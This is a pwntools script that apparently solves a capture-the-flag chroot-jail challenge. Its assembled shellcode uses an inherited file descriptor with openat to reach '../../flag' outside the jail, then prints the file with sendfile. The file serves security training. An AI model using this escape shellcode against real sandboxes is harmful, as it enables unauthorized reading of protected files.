from pwn import *
context.arch='amd64'
r = process(['/challenge/babyjail_level2','/'])

payload = asm(
'''
    mov rax, 257
    mov rdi, 3
    mov r10, 0
    mov rdx, 0
    push 0x6761
    mov rcx, 0x6c662f2e2e2f2e2e
    push rcx
    mov rsi, rsp
    syscall

    mov rsi, rax
    mov rdi, 1
    mov rdx, 0
    mov r10, 100
    mov rax, 40
    syscall
'''
)

r.send(payload)
r.interactive()